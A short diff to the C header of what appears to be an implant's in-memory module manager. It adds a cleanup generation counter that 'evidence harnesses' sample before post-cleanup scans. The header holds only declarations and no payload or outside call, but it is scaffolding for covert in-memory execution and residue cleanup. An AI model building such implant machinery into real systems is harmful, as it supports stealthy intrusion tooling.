@@ -473,6 +473,7 @@ typedef struct _MODULE_MANAGER {
     OUTPUT_RING     output_rings[MODMGR_MAX_SLOTS];/* Per-module output rings */
     MODULE_BUS_API  slot_apis[MODMGR_MAX_SLOTS];   /* Per-module bus API copy */
     DWORD           active_count;                   /* Active module count     */
+    DWORD           cleanup_generation;             /* Incremented per cleanup */
     PVOID           implant_ctx;                    /* Back-pointer to ctx     */
     DWORD           next_module_id;                 /* Monotonic module ID     */
     BOOL            initialized;                    /* Manager initialized     */
@@ -505,6 +506,12 @@ int modmgr_execute(MODULE_MANAGER *mgr, const BYTE *package, DWORD len,
  * Returns number of modules that completed or crashed since last poll.
  */
 DWORD modmgr_poll(MODULE_MANAGER *mgr, BYTE *results_out, DWORD *results_len);
+
+/**
+ * Return a monotonic cleanup counter. Evidence harnesses can sample this
+ * before dispatch and require it to increase before post-cleanup scans.
+ */
+DWORD modmgr_cleanup_generation(MODULE_MANAGER *mgr);
 
 /**
  * Clean up a completed/crashed module slot: flip memory to RW,
